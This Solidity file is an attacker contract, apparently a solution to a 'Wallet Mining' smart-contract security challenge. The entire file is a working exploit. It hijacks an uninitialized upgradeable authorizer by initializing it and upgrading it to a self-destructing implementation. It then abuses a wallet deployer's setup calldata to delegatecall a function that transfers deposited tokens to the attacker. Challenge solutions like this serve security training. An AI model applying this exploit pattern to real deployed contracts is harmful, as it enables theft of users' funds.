// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./AuthorizerUpgradeable.sol";
import "./WalletDeployer.sol";

contract WalletMiningAttacker {
    AuthorizerUpgradeable private authorizationImplementation;

    WalletDeployer private walletDeployer;

    address immutable original;

    address private token;
    uint private depositAmount;
    address private owner;

    function die() public {
        console.log("called");
        selfdestruct(payable(address(this)));
    }

    constructor(
        address _authorization,
        address _walletDeployer,
        address _token,
        uint _depositAmunt
    ) {
        original = address(this);
        token = _token;
        depositAmount = _depositAmunt;
        owner = msg.sender;
        authorizationImplementation = AuthorizerUpgradeable(_authorization);
        walletDeployer = WalletDeployer(_walletDeployer);
    }

    function attackAuthorization() public {
        address[] memory emp = new address[](0);
        authorizationImplementation.init(emp, emp);
        authorizationImplementation.upgradeToAndCall(
            address(this),
            abi.encodeWithSignature("die()")
        );
    }

    function attackWalletDeployer() public {
        for (uint i = 1; i <= 42; ) {
            address[] memory owners = new address[](1);
            owners[0] = address(this);
            bytes memory calld = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,
                1,
                0,
                0,
                0,
                0,
                0,
                0
            );
            walletDeployer.drop(calld);
            unchecked {
                ++i;
            }
        }

        bytes memory attackData = abi.encodeWithSignature(
            "attackForERC20(address,uint256)",
            token,
            depositAmount
        );

        address[] memory owners = new address[](1);
        owners[0] = address(this);
        walletDeployer.drop(
            abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                owners,
                1,
                address(this),
                attackData,
                0,
                0,
                0,
                0
            )
        );
    }

    function attack() external {
        attackWalletDeployer();
        IERC20(token).transfer(owner, IERC20(token).balanceOf(address(this)));
    }

    function attackForERC20(address _token, uint amount) public {
        IERC20(_token).transfer(original, amount);
    }

    function proxiableUUID() external view virtual returns (bytes32) {
        bytes32 _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        return _IMPLEMENTATION_SLOT;
    }

    receive() external payable {}
}
